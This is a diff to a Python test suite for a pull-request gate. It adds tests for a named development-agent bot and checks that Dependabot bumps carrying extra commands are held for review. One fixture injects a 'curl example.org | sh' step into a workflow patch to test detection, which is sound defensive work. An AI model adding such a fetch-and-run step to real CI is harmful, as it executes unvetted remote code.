@@ -13,6 +13,7 @@ import unittest
 from pathlib import Path
 
 ROOT = Path(__file__).resolve().parents[2]
+AGENT = "dekajoule-oos-agent[bot]"
 # `gh api [--paginate] PATH [--jq EXPR]`: the file for PATH from $FAKE_GH, through jq when asked
 FAKE_GH = r'''#!/bin/sh
 [ "$1" = api ] || exit 9
@@ -120,8 +121,10 @@ class PullRequests(unittest.TestCase):
         self.assertEqual(self.gate()["waited"], "success", "the maintainer's own, whatever it touches")
         self.pull(["ui/src/ui.rs"], author="owner", fork=True)
         self.assertEqual(self.gate()["waited"], "pending", "from a fork, under the maintainer's name")
-        self.pull(["ui/src/ui.rs"], author="owner", ref="copilot/x", draft=False)
-        self.assertEqual(self.gate()["waited"], "pending", "an agent's, under the maintainer's name")
+        self.pull(["hal/src/dho/seq.rs", ".github/workflows/ci.yml"], author=AGENT, bot=True)
+        self.assertEqual(self.gate()["waited"], "success", "the development agent's, whatever it touches")
+        self.pull(["ui/src/ui.rs"], author=AGENT, bot=True, fork=True)
+        self.assertEqual(self.gate()["waited"], "pending", "from a fork, under the agent's name")
         self.pull(["ui/src/ui.rs"], author="someone")
         self.assertEqual(self.gate()["waited"], "pending", "somebody else's, 24 hours")
 
@@ -150,7 +153,7 @@ class PullRequests(unittest.TestCase):
             self.assertEqual(self.gate()["waited"], "pending", f"{path} is not seen by the comparison")
 
     def test_the_review(self):
-        self.pull(["ui/src/ui.rs"], draft=True, ref="copilot/x")
+        self.pull(["ui/src/ui.rs"], draft=True)
         self.assertEqual(self.gate()["review"], "pending", "a draft has no review yet")
         self.pull(["ui/src/ui.rs"])
         self.assertEqual(self.gate()["review"], "pending", "no review yet")
@@ -186,27 +189,29 @@ class PullRequests(unittest.TestCase):
         self.pull(["ui/src/ui.rs"], author="Copilot", bot=True)
         self.assertEqual(self.gate()["owner"], "pending", "a bot that is not Dependabot")
 
-    def test_an_agents_pull_request(self):
-        # opened in the name of the person who gave the task, as a draft on a copilot/ branch
-        self.pull(["ui/src/ui.rs"], author="owner", ref="copilot/fix-something", draft=True)
-        self.assertEqual(self.gate()["owner"], "pending", "the maintainer's name does not make it the maintainer's")
-        self.pull(["ui/src/ui.rs"], author="owner", ref="copilot/fix-something", draft=False)
-        self.assertEqual(self.gate()["owner"], "success", "a person marked it ready")
-        self.pull(["ui/src/ui.rs"], author="someone", fork=True, ref="copilot/fix-something", draft=False)
-        self.assertEqual(self.gate()["owner"], "pending", "a fork's branch of that name is a fork's")
-        self.pull(["ui/src/ui.rs"], author="owner", ref="copilot/fix-something", draft=True, title="Lints: x in ui")
+    def test_the_development_agents_pull_request(self):
+        self.pull(["ui/src/ui.rs"], author=AGENT, bot=True, title="Lints: x in ui")
+        gate = self.gate()
+        self.assertEqual((gate["waited"], gate["owner"]), ("success", "success"))
+        self.assertEqual(gate["review"], "pending", "Copilot reviews it like any other")
         self.assertEqual(self.labels(), {"area/ui", "type/refactor", "agent"})
-        self.pull(["ui/src/ui.rs"], author="someone", fork=True, ref="copilot/fix-something", title="Lints: x in ui")
-        self.assertEqual(self.labels(), {"area/ui", "type/refactor"})
+        self.pull(["ui/src/ui.rs"], author=AGENT, bot=True, labels=["hold"])
+        self.assertEqual(self.gate()["owner"], "pending", "held")
+        self.pull(["hal/src/dho/seq.rs"], author=AGENT, bot=True)
+        self.assertEqual(self.gate()["unit"], "pending", "a scope is still needed")
+        self.pull(["ui/src/ui.rs"], author="someone", ref="copilot/fix-something")
+        self.assertEqual(self.gate()["owner"], "pending", "a branch name makes nobody an agent")
 
     def test_dependabot(self):
         bump = "@@ -1 +1 @@\n-      - uses: actions/checkout@aaa # v4.4.0\n+      - uses: actions/checkout@bbb # v4.5.0"
         self.pull([".github/workflows/ci.yml"], author="dependabot[bot]", bot=True,
                   patches={".github/workflows/ci.yml": bump})
-        self.assertEqual(self.gate()["owner"], "success")
+        gate = self.gate()
+        self.assertEqual((gate["owner"], gate["review"]), ("success", "success"), "no review for a bump")
         self.pull([".github/workflows/ci.yml"], author="dependabot[bot]", bot=True,
                   patches={".github/workflows/ci.yml": bump + "\n+        run: curl example.org | sh"})
-        self.assertEqual(self.gate()["owner"], "pending", "more than the commit of an action")
+        gate = self.gate()
+        self.assertEqual((gate["owner"], gate["review"]), ("pending", "pending"), "more than the commit of an action")
         self.pull([".github/workflows/ci.yml", "tools/check.sh"], author="dependabot[bot]", bot=True,
                   patches={".github/workflows/ci.yml": bump})
         self.assertEqual(self.gate()["owner"], "pending", "a file that is no workflow")
